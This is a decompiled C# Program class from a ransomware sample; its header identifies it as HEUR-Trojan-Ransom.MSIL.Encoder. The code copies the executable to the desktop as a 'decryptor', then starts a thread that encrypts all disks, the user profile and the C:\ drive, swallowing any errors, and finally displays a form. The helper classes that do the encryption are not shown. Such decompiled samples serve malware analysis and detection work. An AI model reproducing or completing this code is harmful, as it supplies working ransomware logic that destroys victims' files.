// Decompiled with JetBrains decompiler
// Type: TimeTime.Program
// Assembly: TimeTime, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1744989C-CFB2-4B0D-916E-DDB6E6C66030
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Ransom.MSIL.Encoder.gen-729c6065308607de0b58a67f5ab47a6721c248ea62969fb0baca5fc57c383272.exe

using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace TimeTime
{
  internal static class Program
  {
    private static void DoStuff()
    {
      try
      {
        File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + Settings.decryptor_file_name);
        Cryptor.EncryptDisks();
        Cryptor.TryEncryptFolder(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
        Cryptor.EncryptFolder("C:\\");
      }
      catch (Exception ex)
      {
      }
    }

    [STAThread]
    private static void Main()
    {
      FileManager.Init();
      foreach (string file in FileManager.GetFiles())
        Cryptor.encr_files.Add(file);
      try
      {
        new Thread(new ThreadStart(Program.DoStuff)).Start();
      }
      catch (Exception ex)
      {
        Program.DoStuff();
      }
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      Application.Run((Form) new Form1());
    }
  }
}
